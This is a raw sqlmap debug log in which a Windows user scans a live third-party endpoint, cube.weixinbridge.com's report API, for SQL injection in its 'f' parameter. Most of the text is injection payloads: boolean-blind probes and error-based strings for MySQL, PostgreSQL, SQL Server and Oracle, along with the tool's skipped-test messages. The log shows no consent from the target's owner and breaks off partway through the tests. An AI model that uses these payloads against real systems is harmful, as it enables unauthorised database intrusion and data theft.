        ___

       __H__

 ___ ___[,]_____ ___ ___  {1.8.3.12#dev}

|_ -| . [']     | .'| . |

|___|_  [,]_|_|_|__,|  _|

      |_|V...       |_|   https://sqlmap.org



[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program



[*] starting @ 16:21:56 /2024-04-08/



[16:21:56] [DEBUG] cleaning up configuration parameters

[16:21:56] [DEBUG] setting the HTTP timeout

[16:21:56] [DEBUG] setting the HTTP User-Agent header

[16:21:56] [DEBUG] creating HTTP requests opener object

[16:21:56] [DEBUG] initializing the knowledge base

[1/1] URL:

GET https://cube.weixinbridge.com/cube/report/reportbizdata?f=json&report_items=[{%22biz_id%22:1212,%22time%22:1712564515,%22type%22:1001,%22code%22:0,%22apiname%22:%22pcappboardreport%22,%22message%22:%22%22,%22cost%22:174}]

do you want to test this URL? [Y/n/q]

> Y

[16:21:56] [DEBUG] used the default behavior, running in batch mode

[16:21:56] [INFO] testing URL 'https://cube.weixinbridge.com/cube/report/reportbizdata?f=json&report_items=[{%22biz_id%22:1212,%22time%22:1712564515,%22type%22:1001,%22code%22:0,%22apiname%22:%22pcappboardreport%22,%22message%22:%22%22,%22cost%22:174}]'

it appears that provided value for GET parameter 'report_items' is JSON deserializable. Do you want to inject inside? [y/N] N

[16:21:56] [DEBUG] used the default behavior, running in batch mode

[16:21:56] [INFO] using 'C:\Users\LYZ\AppData\Local\sqlmap\output\results-04082024_0421pm.csv' as the CSV results file in multiple targets mode

[16:21:56] [DEBUG] resolving hostname 'cube.weixinbridge.com'

[16:21:56] [INFO] testing connection to the target URL

[16:21:56] [INFO] testing if the target URL content is stable

[16:21:56] [INFO] target URL content is stable

[16:21:56] [INFO] testing if GET parameter 'f' is dynamic

[16:21:56] [PAYLOAD] 8591

[16:21:56] [WARNING] GET parameter 'f' does not appear to be dynamic

[16:21:56] [PAYLOAD] json").),()(',

[16:21:57] [WARNING] heuristic (basic) test shows that GET parameter 'f' might not be injectable

[16:21:57] [PAYLOAD] json'fwaOoE<'">XDsEGX

[16:21:57] [INFO] testing for SQL injection on GET parameter 'f'

[16:21:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[16:21:57] [PAYLOAD] json') AND 8849=7481 AND ('rqwB'='rqwB

[16:21:57] [PAYLOAD] json' AND 2448=7787 AND 'GgAx'='GgAx

[16:21:57] [PAYLOAD] json) AND 5300=9512 AND (2642=2642

[16:21:57] [PAYLOAD] json AND 6723=3810

[16:21:57] [PAYLOAD] json AND 9565=9651-- EGir

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1)

[16:21:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'

[16:21:57] [PAYLOAD] (SELECT (CASE WHEN (7830=7391) THEN 'json' ELSE (SELECT 7391 UNION SELECT 9262) END))

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because the level (4) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:21:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

[16:21:57] [PAYLOAD] json') AND EXTRACTVALUE(9563,CONCAT(0x5c,0x7178716271,(SELECT (ELT(9563=9563,1))),0x7178766a71)) AND ('LlkZ'='LlkZ

[16:21:57] [PAYLOAD] json' AND EXTRACTVALUE(9563,CONCAT(0x5c,0x7178716271,(SELECT (ELT(9563=9563,1))),0x7178766a71)) AND 'wvpB'='wvpB

[16:21:57] [PAYLOAD] json) AND EXTRACTVALUE(9563,CONCAT(0x5c,0x7178716271,(SELECT (ELT(9563=9563,1))),0x7178766a71)) AND (7800=7800

[16:21:57] [PAYLOAD] json AND EXTRACTVALUE(9563,CONCAT(0x5c,0x7178716271,(SELECT (ELT(9563=9563,1))),0x7178766a71))

[16:21:57] [PAYLOAD] json AND EXTRACTVALUE(9563,CONCAT(0x5c,0x7178716271,(SELECT (ELT(9563=9563,1))),0x7178766a71))-- dask

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:21:57] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)

[16:21:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'

[16:21:57] [PAYLOAD] json') AND 4048=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4048=4048) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND ('tEOL'='tEOL

[16:21:57] [PAYLOAD] json' AND 4048=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4048=4048) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND 'doRN'='doRN

[16:21:57] [PAYLOAD] json) AND 4048=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4048=4048) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND (7928=7928

[16:21:57] [PAYLOAD] json AND 4048=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4048=4048) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)

[16:21:58] [PAYLOAD] json AND 4048=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4048=4048) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)-- oCKA

[16:21:58] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'

[16:21:58] [PAYLOAD] json') AND 1407 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1407=1407) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND ('DDIu'='DDIu

[16:21:58] [PAYLOAD] json' AND 1407 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1407=1407) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND 'KapP'='KapP

[16:21:58] [PAYLOAD] json) AND 1407 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1407=1407) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113))) AND (6811=6811

[16:21:58] [PAYLOAD] json AND 1407 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1407=1407) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))

[16:21:58] [PAYLOAD] json AND 1407 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (1407=1407) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))-- aiID

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)

[16:21:58] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'

[16:21:58] [PAYLOAD] json') AND 5089=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5089=5089) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('UoSg'='UoSg

[16:21:58] [PAYLOAD] json' AND 5089=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5089=5089) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'NCjM'='NCjM

[16:21:58] [PAYLOAD] json) AND 5089=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5089=5089) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (4986=4986

[16:21:58] [PAYLOAD] json AND 5089=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5089=5089) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)

[16:21:58] [PAYLOAD] json AND 5089=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5089=5089) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- RoaO

[16:21:58] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the risk (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the level (5) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the level (2) is higher than the provided (1)

[16:21:58] [INFO] testing 'Generic inline queries'

[16:21:58] [PAYLOAD] (SELECT CONCAT(CONCAT('qxqbq',(CASE WHEN (2942=2942) THEN '1' ELSE '0' END)),'qxvjq'))

[16:21:58] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)

